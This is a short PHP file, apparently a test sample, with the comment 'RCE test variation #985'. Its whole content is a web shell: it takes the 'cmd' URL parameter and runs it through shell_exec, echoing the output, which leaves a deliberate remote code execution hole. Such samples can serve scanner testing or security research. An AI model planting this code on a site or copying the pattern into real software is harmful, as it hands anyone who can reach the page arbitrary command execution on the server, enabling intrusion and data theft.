<?php
// RCE test variation #985
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>